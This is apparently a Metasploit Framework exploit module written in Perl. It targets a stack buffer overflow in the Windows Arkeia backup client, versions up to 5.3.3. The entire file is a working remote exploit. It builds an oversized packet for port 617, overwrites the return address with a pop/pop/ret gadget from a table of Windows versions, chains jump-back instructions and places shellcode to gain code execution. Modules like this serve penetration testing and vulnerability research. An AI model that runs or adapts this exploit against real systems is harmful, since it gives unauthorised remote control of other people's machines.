##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::arkeia_type77_win32;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
'Name' => 'Arkeia Backup Client Type 77 Overflow (win32)',
'Version' => '$Revision: 1.1 $',
'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],
'Arch' => [ 'x86' ],
'OS' => [ 'win32'],
'Priv' => 1,
'AutoOpts' => { 'EXITFUNC' => 'process' },

'UserOpts' => 
{
'RHOST' => [1, 'ADDR', 'The target address'],
'RPORT' => [1, 'PORT', 'The target port', 617],
},

'Payload' => 
{
'Space' => 1000,
'BadChars' => "\x00",
'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff", # add esp, -3500 
'Keys' => ['+ws2ord'],
},

'Description' => Pex::Text::Freeform(qq{
This module exploits a stack overflow in the Arkeia backup
client for the Windows platform. This vulnerability affects
all versions up to and including 5.3.3. 
}),

'Refs' => 
[
['URL', 'http://lists.netsys.com/pipermail/full-disclosure/2005-February/031831.html'],
],

'Targets' => 
[
['Arkeia 5.3.3 Windows (All)', 0x004083aa ], # arkeiad.exe
['Windows 2000 English', 0x75022ac4 ], # ws2help.dll
['Windows XP English SP0/SP1', 0x71aa32ad ], # ws2help.dll
['Windows NT 4.0 SP4/SP5/SP6', 0x77681799 ], # ws2help.dll
],

'Keys' => ['arkeia'],
};

sub new {
my $class = shift;
my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
return($self);
}

sub Exploit {
my $self = shift;
my $target_host = $self->GetVar('RHOST');
my $target_port = $self->GetVar('RPORT');
my $target_idx = $self->GetVar('TARGET');
my $shellcode = $self->GetVar('EncodedPayload')->Payload;
my $target = $self->Targets->[$target_idx];

$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

my $s = Msf::Socket::Tcp->new
(
'PeerAddr' => $target_host,
'PeerPort' => $target_port,
);

if ($s->IsError) {
$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
return;
}

my $head = "\x00\x4d\x00\x03\x00\x01\xff\xff";
my $poof = Pex::Text::EnglishText(4096);

# Configure the length value of the data in the packet header
substr($head, 6, 2, pack('n', length($poof)));

# The return address is a pop/pop/ret in the executable or system lib
substr($poof, 1176, 4, pack('V', $target->[1]));

# The pop/pop/ret takes us here, jump back five bytes
substr($poof, 1172, 2, "\xeb\xf9");

# Jump all the way back to our shellcode
substr($poof, 1167, 5, "\xe9".pack('V', -1172));

# Place our shellcode in the beginning of the request
substr($poof, 0, length($shellcode), $shellcode); 

$self->PrintLine("[*] Sending " .length($poof) . " bytes to remote host.");
$s->Send($head);
$s->Send($poof);

# Takes a few seconds for the payload to pop (multiple exceptions)
$s->Recv(-1, 10);

return;
}

1;
